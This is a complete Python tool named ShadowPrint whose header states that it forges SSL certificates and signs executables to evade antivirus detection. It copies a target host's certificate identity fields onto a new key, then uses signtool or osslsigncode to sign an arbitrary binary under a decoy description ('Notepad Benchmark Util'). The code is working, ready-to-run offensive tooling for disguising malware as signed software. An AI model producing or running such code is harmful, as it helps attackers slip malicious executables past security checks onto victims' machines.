#!/usr/bin/env python3
##Author : BadBoy17
##Email  : kr6261@srmist.edu.in
##Descr  : Forges SSL certificates and digitally signs executables to bypass antivirus detection.s

import argparse
from OpenSSL import crypto
import ssl
import os
import subprocess
import shutil
from pathlib import Path
import sys

TIMESTAMP_URL = "http://sha256timestamp.ws.symantec.com/sha256/timestamp"

def main():
    print(""" +-+-+-+-+-+-+-+-+-+-+-+-+
 |S|h|a|d|o|w|P|r|i|n|t|
 +-+-+-+-+-+-+-+-+-+-+-+-+

  ShadowPrint v2.0
  Author: BadBoy17\n""")
    parser = argparse.ArgumentParser(description="ShadowPrint: Spoof SSL certificates and sign executables for AV evasion.")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--host', help="Hostname to clone certificate from")
    group.add_argument('--cert-file', help="Path to local certificate file to clone")
    parser.add_argument('--port', default=443, type=int, help="Port for the host (default 443)")
    parser.add_argument('signee', help="Input executable to sign")
    parser.add_argument('signed', help="Output signed executable")
    parser.add_argument('--description', default="Notepad Benchmark Util", help="Description for the signed executable")
    parser.add_argument('--timestamp-url', default=TIMESTAMP_URL, help="Timestamp server URL")
    parser.add_argument('--keep-temps', action='store_true', help="Keep temporary certificate files")
    args = parser.parse_args()

    # Get the certificate
    if args.cert_file:
        with open(args.cert_file, 'r') as f:
            ogcert = f.read()
        name = Path(args.cert_file).stem
    else:
        host = args.host
        port = args.port
        print(f"[+] Fetching certificate from {host}:{port}")
        ogcert = ssl.get_server_certificate((host, port))
        name = host

    x509 = crypto.load_certificate(crypto.FILETYPE_PEM, ogcert.encode())

    # Create dirs
    certDir = Path('certs')
    certDir.mkdir(exist_ok=True)

    CNCRT = certDir / f"{name}.crt"
    CNKEY = certDir / f"{name}.key"
    PFXFILE = certDir / f"{name}.pfx"

    # Generate key
    k = crypto.PKey()
    # Ensure minimum key size for compatibility
    key_bits = max(x509.get_pubkey().bits(), 2048)
    k.generate_key(crypto.TYPE_RSA, key_bits)

    # Create cert
    cert = crypto.X509()
    cert.set_version(x509.get_version())
    cert.set_serial_number(x509.get_serial_number())
    cert.set_subject(x509.get_subject())
    cert.set_issuer(x509.get_issuer())
    cert.set_notBefore(x509.get_notBefore())
    cert.set_notAfter(x509.get_notAfter())
    cert.set_pubkey(k)
    cert.sign(k, 'sha256')

    # Write files
    with open(CNCRT, 'wb') as f:
        f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
    with open(CNKEY, 'wb') as f:
        f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))

    # Create PFX
    try:
        pfx = crypto.PKCS12()
        pfx.set_privatekey(k)
        pfx.set_certificate(cert)
        pfxdata = pfx.export()
    except AttributeError:
        # Fallback for newer versions
        try:
            pfx = crypto.PKCS12Type()
            pfx.set_privatekey(k)
            pfx.set_certificate(cert)
            pfxdata = pfx.export()
        except AttributeError:
            # Alternative approach - create PEM files and convert
            print("[!] PKCS12 creation failed, using alternative signing method")
            # For now, we'll skip PFX creation and use direct signing
            pfxdata = None

    if pfxdata:
        with open(PFXFILE, 'wb') as f:
            f.write(pfxdata)
    else:
        print("[!] Skipping PFX file creation")

    # Sign
    signee = args.signee
    signed = args.signed
    timestamp_url = args.timestamp_url
    description = args.description

    if sys.platform == "win32":
        print("[+] Signing with signtool on Windows")
        shutil.copy(signee, signed)
        subprocess.check_call(["signtool.exe", "sign", "/v", "/f", str(PFXFILE),
                               "/d", description, "/tr", timestamp_url,
                               "/td", "SHA256", "/fd", "SHA256", signed])
    elif sys.platform in ("linux", "darwin"):
        print("[+] Signing with osslsigncode on Unix-like system")
        # Remove output file if it exists
        if os.path.exists(signed):
            os.remove(signed)
            print(f"[+] Removed existing file: {signed}")
        
        if pfxdata:
            # Use PFX file if available
            args_cmd = ["osslsigncode", "sign", "-pkcs12", str(PFXFILE),
                        "-n", description, "-i", timestamp_url,
                        "-in", signee, "-out", signed]
        else:
            # Use certificate and key files directly
            print("[+] Using certificate and key files for signing")
            args_cmd = ["osslsigncode", "sign", "-cert", str(CNCRT),
                        "-key", str(CNKEY), "-n", description,
                        "-i", timestamp_url, "-in", signee, "-out", signed]
        subprocess.check_call(args_cmd)
    else:
        raise NotImplementedError(f"Platform {sys.platform} not supported")

    print("[+] Signing completed")

    # Cleanup
    if not args.keep_temps:
        print("[+] Cleaning up temporary files")
        shutil.rmtree(certDir)
    else:
        print(f"[+] Temporary files kept in {certDir}")

if __name__ == "__main__":
    main() 